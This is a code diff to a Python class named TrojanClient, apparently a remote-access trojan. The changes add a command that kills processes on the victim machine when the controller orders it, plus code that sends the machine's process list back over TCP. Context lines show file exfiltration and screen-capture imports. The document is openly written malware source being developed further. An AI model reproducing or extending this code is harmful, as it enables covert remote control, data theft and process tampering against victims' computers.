@@ -6,10 +6,12 @@ import struct
 import sys
 import psutil
 from PIL import ImageGrab, Image
-
 from Attacker import Attacker
 from FileExplorer import FileExplorer
 from ThreadExplorer import ThreadExplorer
+from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox
+from PyQt5.QtCore import QThread, pyqtSignal
+
 '''
 功能:
     1. 文件传输
@@ -170,6 +172,11 @@ class TrojanClient:
                     self.tcpSocket.send(struct.pack('i', len(data)))
                     self.tcpPieceSend(data, self.tcpSocket, 1024)
 
+                elif cmd == "threadlist":
+                    self.tcpSocket.send(struct.pack('i', len(data)))
+                    self.tcpPieceSend(data, self.tcpSocket, 1024)
+                    print("finish sending threadlist")
+
                 elif cmd == "file":
                     length = os.path.getsize(data)
                     self.tcpSocket.send(struct.pack('i', length))
@@ -277,6 +284,12 @@ class TrojanClient:
                 filename = allcmd[1]
                 full = os.path.join(os.getcwd(), filename)
                 self.tcpSend("file", full)
+            elif cmd == 'DeleteThread':
+                threadpid = allcmd[1]
+                print("delete the thread which pid =", end = ' ')
+                print(threadpid)
+                pid = psutil.Process(int(threadpid))
+                pid.terminate()
             elif cmd == "update":
                 try:
                     if self.tcpSocket:
@@ -312,11 +325,12 @@ class TrojanClient:
                 self.transportList()
             
             elif cmd == "thread":
+                print("Start thread control")
                 self.thransportThread()
 
 
     def thransportThread(self):
-        self.threadExplorer.getlist()
+        self.threadExplorer.getList()
         data = json.dumps(self.threadExplorer.Process_message)
         self.tcpSend(cmd="threadlist", data=data.encode('utf8'))
 
